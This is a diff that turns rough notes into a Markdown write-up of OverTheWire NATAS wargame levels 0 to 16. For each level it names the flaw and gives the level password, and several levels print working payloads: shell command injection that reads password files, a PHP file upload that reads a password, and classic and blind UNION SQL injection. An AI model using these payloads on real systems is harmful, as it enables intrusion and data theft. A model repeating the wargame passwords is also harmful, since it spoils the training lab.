@@ -1,102 +1,286 @@
-level 0-1
-in the page's source code the password is present as a comment 
+# OverTheWire – NATAS Write‑up (Level 0 - 16)
+
+---
+
+## Level 0 - 1
+
+
+
+* Viewing page source reveals the password inside a comment.
+
+**Password:**
+
+```
 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq
+```
 
-level 1-2
-ctrl-u can be used to view source code
-TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI 
+---
 
-level 2-3
-in source code "<img src="files/pixel.png">"
-enter the internal files by ading the extension /files/
-inside the directory get the password
+## Level 1 - 2
+
+
+
+* Right-click disabled, but source code still accessible using `Ctrl+U`.
+
+**Password:**
+
+```
+TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI
+```
+
+---
+
+## Level 2 - 3
+
+* Image source referenced as:
+
+  ```html
+  <img src="files/pixel.png">
+  ```
+* Navigating to `/files/` directory reveals internal files.
+
+**Password:**
+
+```
 3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
-security (server-side) misconfiguration
+```
 
-level 3-4
-robots.txt - public file
-it allows the user to guide the search engine bots to wich area it can acses and which area not to
-inside /robots.txt/ it shows which path to block (/s3crt)
-inside this you'll find the password
+---
+
+## Level 3 - 4
+
+
+* `robots.txt` publicly accessible.
+* Disallowed path `/s3crt` contained the password.
+
+**Password:**
+
+```
 QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
+```
 
-level 4-5
-This shows broken access control
-referer tells the server where the request comes from 
-change it as instructed and get the password
+---
+
+## Level 4 - 5
+
+
+* Server validates access using HTTP `Referer`.
+* Changing Referer header grants access.
+
+**Password:**
+
+```
 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
+```
 
-level 5-6
-cookie is used for authentication 
-here if cookie value is changed then access is granted 
-security misconfiguration
-authentication-verify identity and authorization verify permission 
+---
+
+## Level 5 - 6
+
+
+* Authentication controlled by cookie value.
+* Modifying cookie grants access.
+
+
+* Authentication vs Authorization
+verifies who you are,determines what you can do after logging in
+* Security misconfiguration
+
+**Password:**
+
+```
 0RoJwHdSKWFTYR5WuiAewauSuNaBXned
+```
 
-level 6-7
-The passwords are stored in paths accesable through web
-(included file is directley accesible over http)
-cryptographic failure
+---
+
+## Level 6 - 7
+
+
+
+* Password file stored in a web-accessible path.
+* Included files directly accessible over HTTP.
+
+**Password:**
+
+```
 bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
+```
 
-level 7-8
-thr file is included without sanitization
-user can unclude the file path and get the file
-parameter was controlled
-sqli
+---
+
+## Level 7 - 8
+
+**Finding:**
+
+* File included without proper sanitization.
+* user can unclude the file path and get the file
+* parameter was controlled
+* sqli
+
+**Password:**
+
+```
 xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
+```
 
-level 8-9
-the page source showed a code which had been encoded
-cryptographic failure
+---
+
+## Level 8 - 9
+
+**Finding:**
+
+* Encoded value found in page source.
+* Decoding reveals the password.
+
+**Password:**
+
+```
 ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
+```
 
-level 9-10
-; - command separator
+---
+
+## Level 9 - 10
+
+
+* Input passed to shell command without sanitization.
+* `;` used as command separator.
+
+**Payload:**
+
+```
 ; cat /etc/natas_webpass/natas10
-grep -i becomes invalid 
-use escapeshellarg(prevents command chaining
-injection
+```
+
+**Password:**
+
+```
 t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
+```
 
-level 10-11
-same sinario all charectees aare not sanitized
+---
+
+## Level 10 - 11
+
+**Finding:**
+
+* `grep -i` used but wildcards not filtered.
+* `.*` allows reading sensitive files.
+
+**Payload:**
+
+```
 .* /etc/natas_webpass/natas11
-.* can be used
+```
+
+**Password:**
+
+```
 UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
+```
 
-level 11-12
-level said cookie is protected using xor
-url decode from base64 you get the cipher 
-the clear text is {"showpassword":"no","bgcolor":"#ffffff"}
-xor and encode using cyber chef
+---
+
+## Level 11 - 12
+
+* Cookie base64 decoded to XOR cipher.
+* url decode from base64 you get the cipher
+* Cleartext:json
+
+```
+{"showpassword":"no","bgcolor":"#ffffff"}
+```
+
+* Modified using XOR and re-encoded.
+
+**Password:**
+
+```
 yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
+```
 
-level 12-13
-HTTP trafic could be modified 
-php command was added to retrive the password
+---
+
+## Level 12 - 13
+
+
+* HTTP request modified.
+* Uploaded PHP file instead of image.
+* Converted inputed type into a .php 
+
+**Payload:in file**
+
+```
 <?php
 echo file_get_contents("/etc/natas_webpass/natas13");
 ?>
-conerted inputed type into a .php 
+```
+
+**Password:**
+
+```
 trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
+```
 
-level 13-14
+---
 
+## Level 13 - 14
+
+**Password:**
+
+```
 z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
+```
 
-level 14-15
-basic sql injection
+---
+
+## Level 14 - 15
+
+* Login query vulnerable to SQLi.
+
+**Payload:**
+
+```
 namashivaya "OR 1=1 ;#
-SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
+```
 
-level 15-16
-UNION ALL -left side number of columns and right side must match
-```namashivaya "UNION ALL select 1,2 FROM INFORMATION_SCHEMA.tables WHERE table_schema != "mysql" AND table_schema != "information_schema" 
-AND table_schema != "performance_schema" AND substring(table_name, 1,1) = "u";#```
-gets the table name as "users"
-```namashivaya "UNION ALL select 1,2 FROM INFORMATION_SCHEMA.columns WHERE table_name = "users" AND substring(column_name,1,1) = "u";#```
-username,password
-```namashivaya" UNION ALL SELECT 1,2 FROM users WHERE username = "natas16" AND BINARY substring(password,1,1) = "a" LIMIT 1 ;#"```
-limit-Return only one row prevent extra result and error
+**Password:**
+
+```
+SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
+```
+
+---
+
+## Level 15 - 16
+
+
+
+* Used `UNION ALL` and `INFORMATION_SCHEMA`.
+* Extracted table and column names character-by-character.
+
+**Used Payloads:**
+
+```sql
+namashivaya "UNION ALL select 1,2 FROM INFORMATION_SCHEMA.tables WHERE table_schema != "mysql" AND table_schema != "information_schema" 
+AND table_schema != "performance_schema" AND substring(table_name, 1,1) = "u";#
+
+```
+* gets the table name as "users"
+
+```sql
+namashivaya "UNION ALL select 1,2 FROM INFORMATION_SCHEMA.columns WHERE table_name = "users" AND substring(column_name,1,1) = "u";#
+```
+* username,password
+```sql
+namashivaya" UNION ALL SELECT 1,2 FROM users WHERE username = "natas16" AND BINARY substring(password,1,1) = "a" LIMIT 1 ;#
+```
+* limit-Return only one row prevent extra result and error
+**Password:**
+
+```
 hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
+```
+
+---
